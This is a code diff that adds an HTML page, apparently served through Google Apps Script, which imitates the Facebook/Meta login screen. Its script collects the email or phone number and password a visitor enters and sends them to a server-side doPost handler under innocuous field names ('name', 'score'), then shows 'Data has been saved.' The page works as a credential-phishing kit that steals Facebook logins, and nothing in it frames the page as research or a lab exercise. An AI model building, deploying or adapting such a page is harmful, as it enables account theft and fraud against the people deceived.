@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <base target="_top">
+    <title>Facebook</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 50px;
+            background-color: #f0f2f5;
+            margin: 0;
+            text-align: center;
+        }
+        .main-container {
+            width: 100%;
+            max-width: 400px;
+        }
+        .header {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .app-download {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #e7f3ff;
+            color: #444;
+            padding: 10px;
+            border-bottom: 1px solid #ccc;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .app-download img {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+        }
+        .lang {
+            color: #606770;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .fb-logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group input {
+            width: 90%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #f5f6f7;
+            text-align: center;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+        .login-btn {
+            width: 90%;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+        .forgot-password {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .create-account-container {
+            margin-top: 50px;
+        }
+        .create-btn {
+            width: 90%;
+            padding: 14px;
+            border: 1px solid #1877f2;
+            border-radius: 6px;
+            background-color: white;
+            color: #1877f2;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .meta-logo-container {
+            margin-top: 60px;
+            font-size: 14px;
+            color: #606770;
+        }
+        .meta-logo-container span {
+            font-weight: bold;
+        }
+        .message {
+            margin-top: 15px;
+            color: #d9534f;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="header">
+            <div class="app-download">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e6/Google_Play_Store_badge_logo.svg" alt="Google Play logo">
+                Get Facebook for Android and browse faster.
+            </div>
+            <div class="lang">English (UK)</div>
+        </div>
+        <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b3/Facebook_icon.svg" alt="Facebook logo">
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Mobile number or email address">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password">
+        </div>
+        <button class="login-btn" onclick="submitData()">Log in</button>
+        <div id="message" class="message"></div>
+        <div class="forgot-password">
+            <a href="#">Forgotten password?</a>
+        </div>
+        <div class="create-account-container">
+            <button class="create-btn">Create new account</button>
+        </div>
+        <div class="meta-logo-container">
+            <span>Meta</span>
+            <br>
+            <span style="font-weight: normal; font-size: 12px;">About Help More</span>
+        </div>
+    </div>
+
+    <script>
+        function submitData() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var messageDiv = document.getElementById("message");
+
+            if (username === "" || password === "") {
+                messageDiv.style.color = 'red';
+                messageDiv.innerText = "Please enter both fields.";
+                return;
+            }
+
+            google.script.run
+                .withSuccessHandler(onSuccess)
+                .withFailureHandler(onFailure)
+                .doPost({parameter: {name: username, score: password}});
+
+            messageDiv.style.color = 'blue';
+            messageDiv.innerText = "Sending data...";
+        }
+
+        function onSuccess(response) {
+            var messageDiv = document.getElementById("message");
+            messageDiv.style.color = 'green';
+            messageDiv.innerText = "Success! Data has been saved.";
+            document.getElementById("username").value = "";
+            document.getElementById("password").value = "";
+        }
+
+        function onFailure(error) {
+            var messageDiv = document.getElementById("message");
+            messageDiv.style.color = 'red';
+            messageDiv.innerText = "Error: Data could not be saved.";
+            console.error(error);
+        }
+    </script>
+</body>
+</html>
